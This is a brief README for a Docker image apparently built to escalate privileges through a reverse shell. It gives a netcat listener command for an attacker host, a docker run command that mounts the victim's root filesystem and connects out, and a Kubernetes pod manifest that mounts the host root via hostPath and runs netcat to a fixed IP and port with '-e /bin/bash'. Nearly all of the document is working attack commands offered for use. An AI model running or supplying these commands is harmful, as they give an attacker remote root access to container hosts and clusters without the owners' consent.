# netcatrevershell

Docker image for privilege escalation.

On evilhost side:
```
netcat -l -p evilhost_port
```

On victim side:

```
docker run --rm -v /:/host rahulkiit/netcatreverseshell:latest evilhost_host evilhost_port
```

Kubernetes

```
apiVersion: v1
kind: Pod
metadata:
  name: ncat-reverse-shell-pod
  labels:
    app: ncat
spec:
  containers:
  - name: ncat-reverse-shell
    image: rahulkiit/netcatreverseshell:latest
    volumeMounts:
    - mountPath: /host
      name: hostvolume
    args: ['192.168.34.222', '8081', '-e', '/bin/bash']
  volumes:
  - name: hostvolume
    hostPath:
      path: /
      type: Directory
```
